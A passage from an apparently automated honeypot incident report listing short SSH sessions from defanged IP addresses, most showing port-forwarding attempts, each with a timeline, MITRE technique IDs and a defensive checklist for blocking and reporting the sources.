**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:42:03` | `cowrie.session.connect` |
| `2026-08-05 05:42:03` | `cowrie.client.version` |
| `2026-08-05 05:42:03` | `cowrie.client.kex` |
| `2026-08-05 05:42:04` | `cowrie.login.success` |
| `2026-08-05 05:42:04` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:42:04` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:42:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]41` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-150dc3dd5f95

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]110` |
| **First Seen** | 2026-08-05 05:45 |
| **Last Seen** | 2026-08-05 05:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:45:48` | `cowrie.session.connect` |
| `2026-08-05 05:45:48` | `cowrie.client.version` |
| `2026-08-05 05:45:48` | `cowrie.client.kex` |
| `2026-08-05 05:45:49` | `cowrie.login.success` |
| `2026-08-05 05:45:49` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:45:49` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:45:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]110` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f029e7702b3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-05 05:47 |
| **Last Seen** | 2026-08-05 05:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:47:08` | `cowrie.session.connect` |
| `2026-08-05 05:47:08` | `cowrie.client.version` |
| `2026-08-05 05:47:08` | `cowrie.client.kex` |
| `2026-08-05 05:47:09` | `cowrie.login.success` |
| `2026-08-05 05:47:09` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:47:09` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec207fe0a261

| Field | Detail |
|---|---|
| **Source IP** | `221.182.185[.]190` |
| **First Seen** | 2026-08-05 05:48 |
| **Last Seen** | 2026-08-05 05:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:48:02` | `cowrie.session.connect` |
| `2026-08-05 05:48:03` | `cowrie.client.version` |
| `2026-08-05 05:48:03` | `cowrie.client.kex` |
| `2026-08-05 05:48:06` | `cowrie.login.success` |
| `2026-08-05 05:48:07` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:48:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.182.185[.]190` to AbuseIPDB if not already reported
- [ ] Block `221.182.185[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9bcc5307804

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]206` |
| **First Seen** | 2026-08-05 05:48 |
| **Last Seen** | 2026-08-05 05:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:48:09` | `cowrie.session.connect` |
| `2026-08-05 05:48:09` | `cowrie.client.version` |
| `2026-08-05 05:48:09` | `cowrie.client.kex` |
| `2026-08-05 05:48:09` | `cowrie.login.success` |
| `2026-08-05 05:48:09` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:48:09` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:48:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]206` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0403ca1d9a84

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]227` |
| **First Seen** | 2026-08-05 05:48 |
| **Last Seen** | 2026-08-05 05:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:48:28` | `cowrie.session.connect` |
| `2026-08-05 05:48:28` | `cowrie.client.version` |
| `2026-08-05 05:48:28` | `cowrie.client.kex` |
| `2026-08-05 05:48:29` | `cowrie.login.success` |
| `2026-08-05 05:48:29` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:48:29` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]227` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]227` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69c535f032ea

| Field | Detail |
|---|---|
| **Source IP** | `66.228.53[.]136` |
| **First Seen** | 2026-08-05 05:49 |
| **Last Seen** | 2026-08-05 05:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:49:38` | `cowrie.session.connect` |
| `2026-08-05 05:49:38` | `cowrie.login.success` |
| `2026-08-05 05:49:39` | `cowrie.session.params` |
| `2026-08-05 05:49:39` | `cowrie.command.input` |
| `2026-08-05 05:49:39` | `cowrie.command.input` |
| `2026-08-05 05:49:39` | `cowrie.command.failed` |
| `2026-08-05 05:49:39` | `cowrie.command.input` |
| `2026-08-05 05:49:39` | `cowrie.command.failed` |
| `2026-08-05 05:49:39` | `cowrie.command.input` |
| `2026-08-05 05:49:39` | `cowrie.log.closed` |
| `2026-08-05 05:49:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.228.53[.]136` to AbuseIPDB if not already reported
- [ ] Block `66.228.53[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-254508d5d149

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]226` |
| **First Seen** | 2026-08-05 05:51 |
| **Last Seen** | 2026-08-05 05:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:51:24` | `cowrie.session.connect` |
| `2026-08-05 05:51:24` | `cowrie.client.version` |
| `2026-08-05 05:51:24` | `cowrie.client.kex` |
| `2026-08-05 05:51:24` | `cowrie.login.success` |
| `2026-08-05 05:51:25` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:51:25` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:51:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]226` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b27dc2cdfee5

| Field | Detail |
|---|---|
| **Source IP** | `113.158.205[.]225` |
| **First Seen** | 2026-08-05 05:53 |
| **Last Seen** | 2026-08-05 05:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:53:12` | `cowrie.session.connect` |
| `2026-08-05 05:53:13` | `cowrie.client.version` |
| `2026-08-05 05:53:13` | `cowrie.client.kex` |
| `2026-08-05 05:53:14` | `cowrie.login.success` |
| `2026-08-05 05:53:15` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:53:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.158.205[.]225` to AbuseIPDB if not already reported
- [ ] Block `113.158.205[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ada8e9b59655

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]226` |
| **First Seen** | 2026-08-05 05:53 |
| **Last Seen** | 2026-08-05 05:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:53:20` | `cowrie.session.connect` |
| `2026-08-05 05:53:20` | `cowrie.client.version` |
| `2026-08-05 05:53:20` | `cowrie.client.kex` |
| `2026-08-05 05:53:21` | `cowrie.login.success` |
| `2026-08-05 05:53:21` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:53:21` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:53:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]226` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22379c74aba6

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]91` |
| **First Seen** | 2026-08-05 05:58 |
| **Last Seen** | 2026-08-05 05:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:58:03` | `cowrie.session.connect` |
| `2026-08-05 05:58:03` | `cowrie.client.version` |
| `2026-08-05 05:58:03` | `cowrie.client.kex` |
| `2026-08-05 05:58:03` | `cowrie.login.success` |
| `2026-08-05 05:58:04` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:58:04` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]91` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77aa41b38598

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]192` |
| **First Seen** | 2026-08-05 05:58 |
| **Last Seen** | 2026-08-05 05:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:58:05` | `cowrie.session.connect` |
| `2026-08-05 05:58:05` | `cowrie.client.version` |
| `2026-08-05 05:58:05` | `cowrie.client.kex` |
| `2026-08-05 05:58:06` | `cowrie.login.success` |
| `2026-08-05 05:58:06` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:58:06` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:58:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]192` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ab6c5431eab

| Field | Detail |
|---|---|
| **Source IP** | `130.12.181[.]21` |
| **First Seen** | 2026-08-05 06:00 |
| **Last Seen** | 2026-08-05 06:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:00:00` | `cowrie.session.connect` |
| `2026-08-05 06:00:00` | `cowrie.client.version` |
| `2026-08-05 06:00:00` | `cowrie.client.kex` |
| `2026-08-05 06:00:00` | `cowrie.login.success` |
| `2026-08-05 06:00:00` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:00:01` | `cowrie.direct-tcpip.data` |
| `2026-08-05 06:00:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.181[.]21` to AbuseIPDB if not already reported
- [ ] Block `130.12.181[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da72bd620e54

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]110` |
| **First Seen** | 2026-08-05 06:00 |
| **Last Seen** | 2026-08-05 06:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:00:23` | `cowrie.session.connect` |
| `2026-08-05 06:00:23` | `cowrie.client.version` |
| `2026-08-05 06:00:23` | `cowrie.client.kex` |
| `2026-08-05 06:00:23` | `cowrie.login.success` |
| `2026-08-05 06:00:24` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:00:24` | `cowrie.direct-tcpip.data` |
| `2026-08-05 06:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]110` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3f312603e5c

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]224` |
| **First Seen** | 2026-08-05 06:02 |
| **Last Seen** | 2026-08-05 06:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:02:31` | `cowrie.session.connect` |
| `2026-08-05 06:02:31` | `cowrie.client.version` |
| `2026-08-05 06:02:31` | `cowrie.client.kex` |
| `2026-08-05 06:02:32` | `cowrie.login.success` |
| `2026-08-05 06:02:32` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:02:33` | `cowrie.direct-tcpip.data` |
| `2026-08-05 06:02:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]224` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-755d0ca531c3

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]225` |
| **First Seen** | 2026-08-05 06:03 |
| **Last Seen** | 2026-08-05 06:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:03:01` | `cowrie.session.connect` |
| `2026-08-05 06:03:01` | `cowrie.client.version` |
| `2026-08-05 06:03:01` | `cowrie.client.kex` |
| `2026-08-05 06:03:02` | `cowrie.login.success` |
| `2026-08-05 06:03:02` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:03:02` | `cowrie.direct-tcpip.data` |
| `2026-08-05 06:03:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]225` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25098ba9537e

| Field | Detail |
|---|---|
| **Source IP** | `130.12.181[.]23` |
| **First Seen** | 2026-08-05 06:06 |
| **Last Seen** | 2026-08-05 06:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:06:36` | `cowrie.session.connect` |
| `2026-08-05 06:06:36` | `cowrie.client.version` |
| `2026-08-05 06:06:36` | `cowrie.client.kex` |
| `2026-08-05 06:06:36` | `cowrie.login.success` |
| `2026-08-05 06:06:36` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:06:36` | `cowrie.direct-tcpip.data` |
| `2026-08-05 06:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.181[.]23` to AbuseIPDB if not already reported
- [ ] Block `130.12.181[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2490805971d9

| Field | Detail |
|---|---|
| **Source IP** | `130.12.181[.]23` |
| **First Seen** | 2026-08-05 06:08 |
| **Last Seen** | 2026-08-05 06:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:08:03` | `cowrie.session.connect` |
| `2026-08-05 06:08:03` | `cowrie.client.version` |
| `2026-08-05 06:08:03` | `cowrie.client.kex` |
| `2026-08-05 06:08:04` | `cowrie.login.success` |
| `2026-08-05 06:08:04` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:08:04` | `cowrie.direct-tcpip.data` |
| `2026-08-05 06:08:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.181[.]23` to AbuseIPDB if not already reported
- [ ] Block `130.12.181[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-145734cc273f

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]19` |
| **First Seen** | 2026-08-05 06:08 |
| **Last Seen** | 2026-08-05 06:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:08:04` | `cowrie.session.connect` |
| `2026-08-05 06:08:04` | `cowrie.client.version` |
| `2026-08-05 06:08:04` | `cowrie.client.kex` |
| `2026-08-05 06:08:05` | `cowrie.login.success` |
| `2026-08-05 06:08:06` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:08:06` | `cowrie.direct-tcpip.data` |
| `2026-08-05 06:08:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]19` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3043a170b8be

| Field | Detail |
|---|---|
| **Source IP** | `111.171.125[.]94` |
| **First Seen** | 2026-08-05 06:12 |
| **Last Seen** | 2026-08-05 06:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:12:36` | `cowrie.session.connect` |
| `2026-08-05 06:12:37` | `cowrie.client.version` |
| `2026-08-05 06:12:37` | `cowrie.client.kex` |
| `2026-08-05 06:12:39` | `cowrie.login.success` |
| `2026-08-05 06:12:40` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:12:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.125[.]94` to AbuseIPDB if not already reported
- [ ] Block `111.171.125[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-010535b267d4

| Field | Detail |
|---|---|
| **Source IP** | `49.206.201[.]253` |
| **First Seen** | 2026-08-05 06:12 |
| **Last Seen** | 2026-08-05 06:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:12:45` | `cowrie.session.connect` |
| `2026-08-05 06:12:46` | `cowrie.client.version` |
| `2026-08-05 06:12:46` | `cowrie.client.kex` |
| `2026-08-05 06:12:47` | `cowrie.login.success` |
| `2026-08-05 06:12:48` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:12:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.206.201[.]253` to AbuseIPDB if not already reported
- [ ] Block `49.206.201[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e4f93da7faf

| Field | Detail |
|---|---|
| **Source IP** | `95.35.29[.]192` |
| **First Seen** | 2026-08-05 06:12 |
| **Last Seen** | 2026-08-05 06:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:12:54` | `cowrie.session.connect` |
| `2026-08-05 06:12:55` | `cowrie.client.version` |
| `2026-08-05 06:12:55` | `cowrie.client.kex` |
| `2026-08-05 06:12:56` | `cowrie.login.success` |
| `2026-08-05 06:12:57` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:13:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.35.29[.]192` to AbuseIPDB if not already reported
- [ ] Block `95.35.29[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f83f89cd7cf4

| Field | Detail |
|---|---|
| **Source IP** | `106.89.60[.]76` |
| **First Seen** | 2026-08-05 06:13 |
| **Last Seen** | 2026-08-05 06:13 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:13:07` | `cowrie.session.connect` |
| `2026-08-05 06:13:08` | `cowrie.client.version` |
| `2026-08-05 06:13:08` | `cowrie.client.kex` |
| `2026-08-05 06:13:11` | `cowrie.login.success` |
| `2026-08-05 06:13:12` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:13:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.89.60[.]76` to AbuseIPDB if not already reported
- [ ] Block `106.89.60[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca1658f8e828

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]47` |
| **First Seen** | 2026-08-05 06:15 |
| **Last Seen** | 2026-08-05 06:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:15:07` | `cowrie.session.connect` |
| `2026-08-05 06:15:07` | `cowrie.client.version` |
| `2026-08-05 06:15:07` | `cowrie.client.kex` |
| `2026-08-05 06:15:08` | `cowrie.login.success` |
| `2026-08-05 06:15:08` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:15:08` | `cowrie.direct-tcpip.data` |
| `2026-08-05 06:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]47` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74babc3a4fe3

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]103` |
| **First Seen** | 2026-08-05 06:22 |
| **Last Seen** | 2026-08-05 06:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:22:00` | `cowrie.session.connect` |
| `2026-08-05 06:22:00` | `cowrie.client.version` |
| `2026-08-05 06:22:00` | `cowrie.client.kex` |
| `2026-08-05 06:22:00` | `cowrie.login.success` |
